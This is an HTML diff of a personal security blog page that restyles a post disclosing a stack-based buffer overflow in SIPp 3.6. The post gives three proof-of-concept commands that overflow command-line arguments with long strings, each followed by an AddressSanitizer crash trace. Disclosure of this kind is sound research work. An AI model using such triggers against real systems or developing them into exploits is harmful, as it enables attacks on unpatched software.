@@ -9,7 +9,10 @@
     <title>Fakhri Zulkifli</title>
 
     <!-- Bootstrap -->
-    <link rel="stylesheet" href="/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/bootstrap-4.0.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/fontawesome.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/brands.css">
+    <link rel="stylesheet" href="/css/fontawesome-5.13.0/css/solid.css">
     <link rel="stylesheet" href="/css/main.css">
 
     <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
@@ -39,24 +42,23 @@
       <div class="container">
 
         <header class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div class="col-lg-8 col-lg-offset-2" style="margin: auto">
     <h1 class="">Fakhri Zulkifli</h1>
     <p>
-    <div align="center">
-    <a href="https://github.com/fakhrizulkifli" target="_blank"><span class="string">https://github.com/fakhrizulkifli</a>
-    •
-    <a href="https://twitter.com/d0lph1n98" target="_blank"><span class="string">https://twitter.com/d0lph1n98</a>
+    <div style="margin: auto">
+    <a href="https://github.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-github-square"></span></a>
+    <a href="https://twitter.com/d0lph1n98" target="_blank"><span style="font-size: large" class="fab fa-twitter-square"></span></a>
+    <a href="https://linkedin.com/fakhrizulkifli" target="_blank"><span style="font-size: large" class="fab fa-linkedin"></span></a>
     </div>
     </p>
   </div>
 </header>
 
 <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <div class="menu">
       <ul>
-          <li><a href="/">home</a></li>
-          <li><a href="/blog/">blog</a></li>
+          <li><a href="/blog/">/root</a></li>
       </ul>
     </div>
   </div>
@@ -65,12 +67,12 @@
 
 
         <div class="row">
-          <div class="col-lg-8 col-lg-offset-2">
+          <div style="width:-webkit-fill-available">
             <main>
             <div class="post">
 
   <header class="post-header">
-    <h1>SIPp 3.6 - Stack-based Buffer Overflow (PoC)</h1>
+    <h1 style="text-align: center">SIPp 3.6 - Stack-based Buffer Overflow (PoC)</h1>
   </header>
 
   <article class="post-content">
@@ -85,27 +87,27 @@
   </header>
 
   <article class="post-content">
-  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./sipp -3pcc `python -c ‘print “A” * 300'`
+  <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./sipp <span class="nt">-3pcc</span> <span class="sb">`</span>python <span class="nt">-c</span> ‘print “A” <span class="k">*</span> 300<span class="s1">'`
 
 #0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
 #1 0x668d06 in main /home/user/sipp/src/sipp.cpp:1531:17
 #2 0x7ff5ec21282f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
 #3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)
 
-$ ./sipp -i `python -c ‘print “A” * 300'`
+$ ./sipp -i `python -c ‘print “A” * 300'</span><span class="sb">`</span>
 
-#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
-#1 0x66a303 in main /home/user/sipp/src/sipp.cpp:1477:17
-#2 0x7f281302682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
-#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)
+<span class="c">#0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425</span>
+<span class="c">#1 0x66a303 in main /home/user/sipp/src/sipp.cpp:1477:17</span>
+<span class="c">#2 0x7f281302682f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291</span>
+<span class="c">#3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)</span>
 
-$ ./sipp -log_file `python -c ‘print “A” * 300'`
+<span class="nv">$ </span>./sipp <span class="nt">-log_file</span> <span class="sb">`</span>python <span class="nt">-c</span> ‘print “A” <span class="k">*</span> 300<span class="s1">'`
 
 #0 0x448364 in strcpy /home/user/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:425
 #1 0x66912f in main /home/user/sipp/src/sipp.cpp:1706:17
 #2 0x7f6ca663782f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
 #3 0x41f1a8 in _start (/home/user/sipp/sipp+0x41f1a8)
-</code></pre></div></div>
+</span></code></pre></div></div>
 
   </article>
 
@@ -140,7 +142,7 @@ $ ./sipp -log_file `python -c ‘print “A” * 300'`
         </div>
 
         <div class="row">
-  <div class="col-lg-8 col-lg-offset-2">
+  <div style="width:-webkit-fill-available">
     <footer>
       
     </footer>
